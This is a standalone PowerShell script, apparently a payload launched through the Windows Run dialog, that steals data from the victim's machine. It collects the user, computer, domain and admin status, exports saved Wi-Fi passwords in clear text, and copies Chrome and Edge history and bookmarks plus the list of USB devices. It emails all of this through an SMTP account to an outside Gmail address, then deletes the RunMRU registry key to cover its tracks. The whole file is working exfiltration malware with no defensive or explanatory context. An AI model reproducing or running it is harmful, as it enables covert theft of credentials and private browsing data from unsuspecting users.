$SmtpServer = "poczta.interia.pl" ; $SmtpPort = "587"
$secpasswd = ConvertTo-SecureString $Password -AsPlainText -Force
$user = $u + "@interia.pl"
$cred = New-Object System.Management.Automation.PSCredential ($user, $secpasswd)
$Subject = "Computer check"
$To = $T + "@gmail.com"

$name = $env:UserName
$computername = $env:ComputerName
$domain = $env:USERDOMAIN
$admin = "No admin"

function is_admin{
Param($a)
$t = Get-LocalGroupMember -Group $a | Select-Object Name
$t.Name -ccontains "$env:ComputerName\$env:UserName"}
$chrome = Test-Path -Path "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" -PathType Leaf
$edge = Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/History" -PathType Leaf
$chromebook = Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf
$edgebook = Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -PathType Leaf
netsh wlan export profile key=clear; Select-String -Path *.xml -Pattern 'keyMaterial'> $env:tmp/wifi.txt
if ($edgebook -eq $true){
$edgbook = "$env:USERNAME-edge_bookmarks.txt"
Copy-Item "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -Destination "$env:tmp/$edgbook"}
if ($chromebook -eq $true){
$chrbook = "$env:USERNAME-chrome_bookmarks.txt"
Copy-Item "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -Destination "$env:tmp/$chrbook" }
if ($chrome -eq $true) {
$chrhis = "$env:USERNAME-chrome_history"
Copy-Item "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" -Destination "$env:tmp\$chrhis" }
if ($edge -eq $true) {
$edghis = "$env:USERNAME-edge_history"
Copy-Item "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History" -Destination "$env:tmp\$edghis" }
if ($computername -eq $domain) {
if ($PSUICulture -eq "pl-PL"){
if (is_admin -a 'Administratorzy'-eq $true){
$admin = "Is admin"}}
else {
if (is_admin -a 'Administrators'-eq $true){
$admin = "Is admin"}}}
else{
$admin = "Domain user"}

$u = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }
$F2 = "$env:USERNAME-USB.csv"
$u | Export-Csv -Path "$env:tmp/$F2" -NoTypeInformation
$Body = "<h3>Username: 3333<br>ComputerName: ::<br>Domain: ww<br>Admin: xx</h3>" -replace "3333",$name  -replace "::",$computername -replace "ww",$domain -replace "xx",$admin

Send-MailMessage -From $user -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -Credential $cred -UseSsl -BodyAsHtml -Attachments "$env:tmp/$F2,$env:tmp/wifi.txt,$env:tmp/$edgbook,$env:tmp/$chrbook,$env:tmp\$chrhis,$env:tmp\$edghis" 
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
